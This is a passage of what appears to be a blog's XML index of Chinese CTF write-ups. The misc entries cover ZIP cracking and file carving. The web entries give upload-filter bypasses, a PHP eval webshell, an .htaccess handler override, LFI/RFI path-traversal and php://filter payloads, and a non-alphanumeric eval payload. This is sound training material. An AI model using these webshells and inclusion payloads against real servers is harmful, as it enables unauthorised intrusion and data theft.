-P指定密码，解压后查看4number.txt拿到flag</span></span><br></pre></td></tr></table></figure><p>cs</p>]]></content>
      
      
      <categories>
          
          <category> ctf学习 </category>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc_answer</title>
      <link href="/posts/f4fd6ff9.html"/>
      <url>/posts/f4fd6ff9.html</url>
      
        <content type="html"><![CDATA[<h2 id="misc题解"><a href="#misc题解" class="headerlink" title="misc题解"></a>misc题解</h2><p>bf6题解：</p><p>1.压缩包，放kali，有png，用bk</p><p>2.准备png开头 明文文件</p><p>echo 开头码 | xxd -r ps &gt; 明文文件</p><p>3.得到密钥</p><p>bkcrack -C -c -p -o</p><p>4.解密压缩文件</p><p>bkcrack -C -c -k -d</p><p>5.发现图片有隐藏的10编码，steg打开得到乱码，图片comment里面有密钥，解码后flag</p><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>一个完整的 JPG 文件由 FF D8 开头，FF D9结尾<br> 在使用图片浏览器时，图片浏览器会忽略 FF D9 以后的内容，因此可以在 JPG 文件中加入其他文件。其他文件隐藏如png.gif文件隐藏也是这个道理。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ========== 前期定位工具 &amp; 切换工作目录 ==========</span></span><br><span class="line"><span class="comment"># 1. （尝试找bkcrack目录失败，改用全局查找工具路径）</span></span><br><span class="line"><span class="built_in">which</span> bkcrack  <span class="comment"># 确认bkcrack路径：/usr/local/bin/bkcrack</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 切换到桌面（二维码图片所在目录，核心工作目录）</span></span><br><span class="line"><span class="built_in">cd</span> ~/Desktop</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== 1. 从二维码中分离加密ZIP包 ==========</span></span><br><span class="line"><span class="comment"># 3. 用binwalk提取二维码中隐藏的ZIP数据</span></span><br><span class="line">binwalk -e QR_code.png  <span class="comment"># 分离出加密ZIP包（偏移0x1D7，对应文件1D7.zip）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 进入分离后的目录，查看并复制ZIP包到桌面</span></span><br><span class="line"><span class="built_in">cd</span> _QR_code.png.extracted  <span class="comment"># 进入binwalk生成的提取目录</span></span><br><span class="line"><span class="built_in">ls</span>                         <span class="comment"># 查看分离出的文件：1D7.zip</span></span><br><span class="line"><span class="built_in">cp</span> 1D7.zip ~/Desktop/      <span class="comment"># 复制ZIP包到桌面（方便后续操作）</span></span><br><span class="line"><span class="built_in">cd</span> ~/Desktop               <span class="comment"># 切回桌面</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.爆破密码，打开就ok</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">原来思路：</span><br><span class="line"><span class="comment"># ========== 2. 准备明文文件（bkcrack明文攻击用） ==========</span></span><br><span class="line"><span class="comment"># 5. 创建与ZIP内同名的空白文件（4number.txt）</span></span><br><span class="line"><span class="built_in">touch</span> 4number.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== 3. 尝试bkcrack明文攻击（因ZIP包不完整报错，后改用爆破） ==========</span></span><br><span class="line"><span class="comment"># 6. 执行bkcrack明文攻击（报错：ZIP缺少目录尾签名）</span></span><br><span class="line">bkcrack -C 1D7.zip -c 4number.txt -P ./ -p 4number.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== 补充：你后续爆破1D7.zip的核心逻辑（可选命令） ==========</span></span><br><span class="line"><span class="comment"># （若用fcrackzip爆破4位数字密码，示例命令）</span></span><br><span class="line">fcrackzip -b -l 4-4 -u 1D7.zip  <span class="comment"># -b=爆破模式，-l 4-4=4位数字，-u=只显示正确密码</span></span><br><span class="line"><span class="comment"># 爆破成功后解压（假设密码为1234）</span></span><br><span class="line">unzip -P 1234 1D7.zip  <span class="comment"># -P指定密码，解压后查看4number.txt拿到flag</span></span><br></pre></td></tr></table></figure><h2 id="大白-1"><a href="#大白-1" class="headerlink" title="大白 1"></a>大白 1</h2><p>1.发现图片太大，说们看不到全部，其实是图片的高被修改了，不信的话打开属性查看他的高</p><p>2、将图片放在010 Editor，修改图片宽高。我们来分析png文件格式，<br>首先，“89 50 4E 47 0D 0A 1A 0A”为标识png文件的八个字节的文件头标志。<br>然后是IHDR数据块，<br>“00 00 00 0D”说明IHDR头块长为13<br>”49 48 44 52“为IHDR标识（ASCII码为IHDR）</p><p>“00 00 02 A7”为图像的宽，24像素<br>”00 00 01 00“为图像的高，24像素<br><img src="/images/image-20251217150833002.png" alt="image-20251217150833002"></p><p>3.高也改成“00 00 02 A7”</p><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h3><p>这道题目是要分析流量，需要用到wireshark</p><p>1.使用http.request.method&#x3D;&#x3D;POST命令进行过滤，得到一条流量</p><p>问题：为什么不用get？–&gt;用户在登录密码时一般不会用<a href="https://so.csdn.net/so/search?q=get&spm=1001.2101.3001.7020">get</a>方式提交，因为这样不安全，相比较而言post安全一点。</p><p>2.根据图片，点击分析，点击追踪流，选择http看到密码，即flag</p><p>![屏幕截图 2025-12-17 153428](&#x2F;images&#x2F;屏幕截图 2025-12-17 153428.png)</p><h2 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h2><h3 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h3><p>1.exe改成txt，发现先开头什么jpg，base64，把逗号后面的全部base64解密</p><p><img src="/images/image-20251217155500971.png" alt="image-20251217155500971"></p><p>2.解密得到png文件<code>89 50 4E 47 0D</code></p><p><a href="https://the-x.cn/encodings/Base64.aspx">https://the-x.cn/encodings/Base64.aspx</a></p><p><img src="/images/image-20251217154521265.png" alt="image-20251217154521265"></p><p>另外一种方法：010新建文件，edit–&gt;pastefrom–&gt;from base64</p><p>另起一行粘贴base原码，点击save，改后缀，得到二维码</p><p><img src="/images/image-20251217155311781.png" alt="image-20251217155311781"></p><h2 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h2><h3 id="1-3"><a href="#1-3" class="headerlink" title="1"></a>1</h3><p>​ </p><p>公安机关近期截获到某网络犯罪团伙在线交流的数据包，但无法分析出具体的交流内容，聪明的你能帮公安机关找到线索吗？ 注意：得到的 flag 请包上 flag{} 提交</p><p>1.WIRESHARK分析，看到有http，查看，发现有base64编码</p><p>2.解码得到jpg文件，看到flag</p><p>如果没有这中一件解码拿文件我们可以看到utf-8是乱码，试试16进制hex</p><p><img src="/images/image-20251218212909920.png" alt="image-20251218212909920"></p><p>发现ffd8ff的文件头，0110保存为图片就ok</p><h2 id="BUUCTF-BJDCTF2020-藏藏藏-1"><a href="#BUUCTF-BJDCTF2020-藏藏藏-1" class="headerlink" title="BUUCTF [BJDCTF2020]藏藏藏 1"></a>BUUCTF [BJDCTF2020]藏藏藏 1</h2><p>1.0110发现有pk压缩包，还有个docx</p><p><img src="/images/image-20251218214521489.png" alt="image-20251218214521489"></p><p>2.kali打开</p><p>2.1解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk 图片.jpg  //解析得到存在zip</span><br></pre></td></tr></table></figure><p>2.2分离</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost 图片.jpg //分离得到图片中的压缩包，默认在output目录里面</span><br></pre></td></tr></table></figure><p>2.3解压</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip ./output/zip/文件名.zip   //得到 ：福利.docx</span><br></pre></td></tr></table></figure><p>2.4查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 福利.docx  //又发现pk文件头</span><br></pre></td></tr></table></figure><p>2.5binwalk检测，发现很多压缩包</p><p>2.6foremost分离，此时加后缀-t，放在另一个output中</p><p>2.7tree .&#x2F;新output</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ tree ./output_Thu_Dec_18_08_56_09_2025/zip </span><br><span class="line">./output_Thu_Dec_18_08_56_09_2025/zip</span><br><span class="line">└── 00000000.zip</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.8 解压unzip .&#x2F;output_Thu_Dec_18_08_56_09_2025&#x2F;zip&#x2F;00000000.zip</p><p>2.9 得到一张图片，打开是二维码，扫一就ok</p><p><img src="/images/image-20251218220400272.png" alt="image-20251218220400272"></p><h2 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h2><h3 id="1-4"><a href="#1-4" class="headerlink" title="1"></a>1</h3><p><img src="/images/image-20251220163705385.png" alt="image-20251220163705385"></p><h2 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h2><h3 id="1-5"><a href="#1-5" class="headerlink" title="1"></a>1</h3><p>![屏幕截图 2025-12-20 164112](&#x2F;images&#x2F;屏幕截图 2025-12-20 164112.png)</p><h2 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h2><h3 id="1-6"><a href="#1-6" class="headerlink" title="1"></a>1</h3><p><img src="/images/image-20251220164742430.png" alt="image-20251220164742430"></p><p><img src="/images/image-20251220164954811.png" alt="image-20251220164954811"></p><p><img src="/images/image-20251220164727740.png" alt="image-20251220164727740"></p><h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><h3 id="1-7"><a href="#1-7" class="headerlink" title="1"></a>1</h3><p><img src="/images/image-20251220165504312.png" alt="image-20251220165504312"></p><p>1.steglove extract preview发现pk</p><p>​   保存（save bin）为zip</p><p>2.解压出现名字为1的文件</p><p>3.改后缀txt或者010打开，即可查看</p><p><img src="/images/image-20251220174136448.png" alt="image-20251220174136448"></p><p><img src="/images/image-20251220174526862.png" alt="image-20251220174526862"></p>]]></content>
      
      
      <categories>
          
          <category> ctf题解 </category>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwntijie</title>
      <link href="/posts/54983b3f.html"/>
      <url>/posts/54983b3f.html</url>
      
        <content type="html"><![CDATA[<h2 id="pwn题解"><a href="#pwn题解" class="headerlink" title="pwn题解"></a>pwn题解</h2><p>1.虚拟机连接靶机：nc 网址 端口</p><p>2.ls查看到flag</p><p>3.cat flag</p><p><img src="/images/image-20251217165855497.png" alt="image-20251217165855497"></p>]]></content>
      
      
      <categories>
          
          <category> ctf题解 </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web-文件上传+包含</title>
      <link href="/posts/6cdf2554.html"/>
      <url>/posts/6cdf2554.html</url>
      
        <content type="html"><![CDATA[<h2 id="web-文件上传-包含"><a href="#web-文件上传-包含" class="headerlink" title="web-文件上传+包含"></a>web-文件上传+包含</h2><h2 id="第二章-web进阶-文件上传-1-文件上传漏洞-题解"><a href="#第二章-web进阶-文件上传-1-文件上传漏洞-题解" class="headerlink" title="[第二章 web进阶]文件上传 1 文件上传漏洞 题解"></a>[第二章 web进阶]文件上传 1 文件上传漏洞 题解</h2><p>1.上传webshell.jpg文件</p><p>2.发现上传成功却无法打开</p><p>是因为上传的目录是随机的，所以用御剑扫描即可，找到对应网页 打开</p><h2 id="ACTF2020-新生赛-Upload-1"><a href="#ACTF2020-新生赛-Upload-1" class="headerlink" title="[ACTF2020 新生赛]Upload 1"></a>[ACTF2020 新生赛]Upload 1</h2><p>十分波折的一道题目哈</p><p>1.文件上传php，失败，显示只能jpg等一堆正常格式</p><p>2.上传木马jpg，改成php，nonono</p><p>3.那改成phtml？黑名单绕过，可以</p><p>4.蚁剑连接得到flag</p><p>注意linux系统查看当前目录flag需要 cat &#x2F;flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 直接上传.php文件 → 失败（前端/后端检测后缀，仅允许jpg/png等图片格式）；</span><br><span class="line">2. 上传图片马）→ 尝试抓包改回.php → 提示no（后端黑名单拦截.php）；</span><br><span class="line">3. 黑名单绕过：改后缀为.phtml（Apache默认解析.phtml为PHP）→ 上传成功；</span><br><span class="line">    细节：Content-Type为image/jpeg不改（绕MIME校验），仅改filename为xxx.phtml；</span><br><span class="line">4. 蚁剑连接：</span><br><span class="line">5. 拿flag：Linux系统下执行命令 cat /flag（题目flag在根目录）</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89</span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><h3 id="1题解"><a href="#1题解" class="headerlink" title="1题解"></a>1题解</h3><p>1.上传webshell.jpg被识破了</p><p>2.换种思路  文件里面 木马前面加个<strong>GIF 图片文件的文件头标识</strong>GIF89，上传成功</p><p>3.抓包后缀改成php，no；php5，no，说明是黑名单绕过，来个phtml，ok</p><p>4.蚁剑连接</p><h2 id="13-第十三章-通幽关·灵纹诡影"><a href="#13-第十三章-通幽关·灵纹诡影" class="headerlink" title="13 第十三章 通幽关·灵纹诡影"></a>13 第十三章 通幽关·灵纹诡影</h2><p>这道题真让我难受</p><p>题目：</p><ul><li>仅受仙灵之气浸润的「云纹图」可修复玉魄核心（建议扩展名：.jpg）</li><li>灵纹尺寸不得大于三寸（30000字节）</li><li>灵纹必须包含噬心魔印（十六进制校验码：FFD8FF）</li></ul><p>1.首先他只是建议jpg，实际上你可以传php然后把头改成FFD8FF，保存后上传</p><p>2.抓包然后改成Content-Type: image&#x2F;jpeg</p><p>3.蚁剑连接</p><p>我的错误点：</p><p>1.一开始用jpg上传，成功后没有更改后缀为php就蚁剑连接了。不是php怎么让木马生效？</p><p>2.改成了php，发现抓包后返回内容为：</p><p>“\xff\xd8\xff&lt;script language&#x3D;&quot;php&quot;&gt;eval\x28$_POST[‘cmd’]\x29;</script>\x0d\x0a\x0d\x0a”</p><p>于是删掉头和尾再上传，发现上传不成功（服务器没法把<code>\xff\xd8\xff</code>转成真实的 FFD8FF 二进制头）</p><p>3.用&lt;FilesMatch “.jpg$”&gt;<br>    SetHandler application&#x2F;x-httpd-php<br></FilesMatch></p><p>发现还是不成功</p><p>（</p><p>先传<code>.htaccess</code>再传<code>.jpg</code>木马的核心逻辑</p><p>「先改规则，再用规则」</p><p><code>.htaccess</code>是「规则文件」，作用是告诉服务器：“从现在开始，<code>/uploads</code>目录下的<code>.jpg</code>文件都按 PHP 解析”。</p><p>传完<code>.htaccess</code>后，必须用<code>test.jpg</code>（含<code>phpinfo()</code>）验证规则是否生效：</p><ul><li>若验证失败（看不到 PHP 信息），说明<code>.htaccess</code>没起作用，继续传<code>.jpg</code>木马也是浪费时间，直接放弃这条路；</li><li>若验证成功，再传真实木马，避免做无用功。</li></ul><h2 id="14-第十四章-御神关·补天玉碑"><a href="#14-第十四章-御神关·补天玉碑" class="headerlink" title="14 第十四章 御神关·补天玉碑"></a>14 第十四章 御神关·补天玉碑</h2><p>提示是htaccess</p><p>1.上传htaccess</p><p>2.上传木马图</p><p>3.蚁剑连接</p><p>这里蚁剑出现返回数据为空，是因为我的木马是<script language="php">eval($_POST[&#39;cmd&#39;]);</script></p><table><thead><tr><th>写法</th><th>兼容性</th><th>是否生效</th><th>蚁剑连接结果</th></tr></thead><tbody><tr><td><code>&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</code></td><td>所有 PHP 版本</td><td>✅ 生效</td><td>正常（空返回但可操作）</td></tr><tr><td><code>&lt;script language=&quot;php&quot;&gt;...&lt;/script&gt;</code></td><td>仅 PHP5.3-</td><td>❌ 不生效</td><td>完全空返回，无法操作</td></tr></tbody></table><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><h4 id="1-本地文件包含（LFI）"><a href="#1-本地文件包含（LFI）" class="headerlink" title="1. 本地文件包含（LFI）"></a>1. 本地文件包含（LFI）</h4><p>比如 PHP 网站有代码：<code>include($_GET[&#39;page&#39;]);</code></p><p>攻击者访问：<code>http://xxx.com/index.php?page=../../../../etc/passwd</code></p><p>→ 服务器会读取 Linux 系统的<code>/etc/passwd</code>文件（存储用户信息的敏感文件）并返回。</p><h4 id="2-远程文件包含（RFI）"><a href="#2-远程文件包含（RFI）" class="headerlink" title="2. 远程文件包含（RFI）"></a>2. 远程文件包含（RFI）</h4><p>如果服务器允许包含远程文件，代码还是<code>include($_GET[&#39;page&#39;]);</code></p><p>攻击者访问：<code>http://xxx.com/index.php?page=http://攻击者服务器/恶意木马.php</code>→ 服务器会下载并执行这个远程木马，攻击者直接控制服务器。</p><p>1.先用伪协议读取index.php源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure><p>为什么不加php变成index.php，因为后端自动拼接php给文件了</p><p>源码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">         &lt;/div&gt;</span><br><span class="line">         &lt;h3&gt;Cheer up!&lt;/h3&gt;</span><br><span class="line">           &lt;p&gt;</span><br><span class="line">             Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!</span><br><span class="line">           &lt;/p&gt;</span><br><span class="line">           &lt;div class=&quot;page-include&quot;&gt;</span><br><span class="line">           &lt;?php</span><br><span class="line">$file = $_GET[&#x27;category&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($file))</span><br><span class="line">&#123;</span><br><span class="line">if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">include ($file . &#x27;.php&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>漏洞 1：strpos($file, “index”) 少写了!&#x3D;&#x3D; false（最致命）<br>strpos函数的返回规则：</p><pre><code>找到字符串：返回匹配的位置（数字，比如indexabc返回 0）；没找到：返回false。</code></pre><p>正常校验应该写strpos(…) !&#x3D;&#x3D; false（严格判断 “找到”），但代码里只写了strpos($file, “index”)：</p><pre><code>只要$file里有index，strpos返回数字（非 false），条件成立；更关键：如果$file以index开头（比如index../../etc/passwd），strpos返回 0，条件也成立！</code></pre><p>漏洞 2：include(<code>$file . &#39;.php&#39;</code>) 是 “拼接后缀”，可通过截断 &#x2F; 路径穿越绕<br>代码会自动给<code>$file</code>加.php后缀（比如传woofers，实际包含woofers.php），但攻击者可以用「路径穿越 + 空字节 &#x2F; 截断」绕过：</p><pre><code>比如传woofers/../../etc/passwd%00：拼接后变成woofers/../../etc/passwd%00.php；%00是 PHP 的 “空字节截断”，会让 PHP 忽略后面的.php，实际包含woofers/../../etc/passwd（读取系统敏感文件）。</code></pre><p>2.访问 index.php?category&#x3D;woofers&#x2F;..&#x2F;flag</p><p>为什么这么做？</p><p><code>文件包含逻辑：</code></p><p>代码会把用户传入的 category 参数值（也就是 woofers&#x2F;..&#x2F;flag）拼接到 include 函数里，还会自动加 .php 后缀，即 include(参数值 + ‘.php’)；</p><p><code>白名单校验逻辑：</code></p><p>只要参数值里包含 woofers&#x2F;meowers&#x2F;index，就允许执行这个 include 操作（否则拒绝）。</p><p>​</p><pre><code>1.参数值woofers/../flag的含义/../：是「路径穿越符」（Linux/PHP 里，A/../B 等价于 B）；比如woofers/../flag → 实际等价于flag（先进入 woofers 目录，再返回上一级，最终指向 flag）；整个参数值的核心：用woofers凑白名单，用/../抵消掉它，最终指向flag。</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2.代码拼接后的实际包含路径</span><br><span class="line">代码会自动给参数值加.php后缀，所以：</span><br><span class="line">用户传的category=woofers/../flag → 拼接后变成 woofers/../flag.php。</span><br></pre></td></tr></table></figure><p>抓包得到多出了一句话：</p><p>​       <!-- Can you read this flag? --></p><p>出现了别的内容，包含成功了flag.php，但是这里也说了flag需要读取<br>利用php:&#x2F;&#x2F;filter伪协议可以套一层协议读取flag.php</p><p>3.读取flag</p><p>伪协议格式：</p><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;你想要看的文件</p><p>php:&#x2F;&#x2F;filter伪协议可以套一层协议，就像：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/woofers/resource=flag</span><br></pre></td></tr></table></figure><p>这样提交的参数既包含有woofers这个字符串，也不会影响正常的包含，得到Flag.php：</p><h2 id="11-第十一章-千机变·破妄之眼"><a href="#11-第十一章-千机变·破妄之眼" class="headerlink" title="11 第十一章 千机变·破妄之眼"></a>11 第十一章 千机变·破妄之眼</h2><p>省流：HDdss看到了 <strong>GET</strong>  参数名由<code>m,n,o,p,q</code>这五个字母组成（每个字母出现且仅出现一次），长度正好为 5，虽然不清楚字母的具体顺序，但是他知道<strong>参数名等于参数值</strong>才能进入。</p><p>其实也就是输入mnopq&#x3D;mnopq就ok，关键是你不知道顺序，也无法短时间内枚举，那就抛给脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">for p in itertools.permutations(&quot;mnopq&quot;):   #itertools.permutations这就在枚举</span><br><span class="line">    k = &quot;&quot;.join(p)  #把p写进去</span><br><span class="line">    r = requests.get(&quot;http://127.0.0.1:48386/&quot;, params=&#123;k: k&#125;)  #params=&#123;k:k&#125;?--&gt;mnopq=mnopq</span><br><span class="line">    if &quot;flag&quot; in r.text:</span><br><span class="line">        print(k)</span><br><span class="line">        print(r.text)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p>1.<code>params</code> 是 <strong>requests 帮你自动处理 GET 参数的东西</strong></p><ol start="2"><li></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.get(url, params=&#123;&quot;a&quot;: &quot;1&quot;&#125;)</span><br></pre></td></tr></table></figure><p>requests 内部其实做了👇</p><p>url + “?” + “a&#x3D;1”</p><p>也就是：</p><p><a href="http://target/index.php?a=1">http://target/index.php?a=1</a></p><p>然后出现了flag.php，find.php </p><p>分别进去发现：</p><p>flag.php 他说答案已经在这里了，你看不到</p><p>find.php 是一个新的查看界面，查看flag，仍然出现”答案已经在这里了，你看不到“</p><p>所以换个思路，我们可以用伪协议读取64编码过的flag.php源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=./flag.php</span><br></pre></td></tr></table></figure><p><img src="/images/image-20251218152437400.png" alt="image-20251218152437400"></p><h2 id="moectf-web-这是…Webshell？"><a href="#moectf-web-这是…Webshell？" class="headerlink" title="moectf web 这是…Webshell？"></a>moectf web 这是…Webshell？</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;shell&#x27;])) &#123;</span><br><span class="line">    $shell = $_GET[&#x27;shell&#x27;];</span><br><span class="line">    if(!preg_match(&#x27;/[A-Za-z0-9]/is&#x27;, $_GET[&#x27;shell&#x27;])) &#123;</span><br><span class="line">        eval($shell);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>所有字母数字都被过滤了</p><p>因为直接写命令的路被堵死，所以 “上传命令文件→用纯符号找文件执行”</p><h4 id="Payload（-shell-）"><a href="#Payload（-shell-）" class="headerlink" title="Payload（?shell=?&gt;&lt;?=.+&#x2F;???&#x2F;????????[@-[];?&gt;）"></a>Payload（<code>?shell=?&gt;&lt;?=</code>.+&#x2F;???&#x2F;????????[@-[]<code>;?&gt;</code>）</h4><table><thead><tr><th>部分</th><th>作用</th><th>通俗解释</th></tr></thead><tbody><tr><td><code>?&gt;&lt;?=</code></td><td>闭合原 PHP 标签，开启短标签执行</td><td>原代码是<code>eval($shell)</code>，加这个能直接执行后面的内容</td></tr><tr><td><code>.</code></td><td>执行系统命令的简写</td><td>在 Linux 里，<code>. filename</code> 等价于 <code>source filename</code>（执行文件里的命令）</td></tr><tr><td><code>/???/????????</code></td><td>通配符，匹配「临时文件路径」</td><td>上传的文件会被 PHP 存到系统临时目录（比如 <code>/tmp/phpXXXXXX</code>），<code>???</code> 匹配 <code>tmp</code>，<code>????????</code> 匹配随机文件名（8 个字符）</td></tr><tr><td><code>[@-[]</code></td><td>通配符，匹配「临时文件名的最后部分」</td><td><code>@</code> 的 ASCII 码是 64；                                                           <code>[</code> 的 ASCII 码是 91；                                                                             <code>[@-[]</code> 翻译：<strong>匹配 ASCII 码 64 到 91 之间的所有字符</strong>。                                                                       利用 ASCII 码范围匹配随机字符，确保能精准命中上传的临时文件</td></tr></tbody></table><p><code>[@-[]</code> 匹配的是 ASCII 码<strong>64（@）到 91（[）</strong> 的字符，包含：</p><p>   @（64）、A-Z（65-90）、[（91）；</p><p>Payload 翻译：<code>执行 /tmp/ 目录下的那个PHP临时文件（也就是我们上传的含命令的文件）</code></p><p>上传的文件里写：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="built_in">env</span></span><br></pre></td></tr></table></figure><ul><li><code>#! /bin/bash</code>：告诉系统这是一个 bash 脚本，要按命令执行；</li><li><code>env</code>：输出系统环境变量（很多 CTF 的 flag 会藏在环境变量里，比如 <code>flag=xxx</code>）；</li><li>也可以把 <code>env</code> 改成 <code>cat /flag</code>，直接读取 flag 文件。</li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf题解 </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-文件上传+包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web-逻辑漏洞</title>
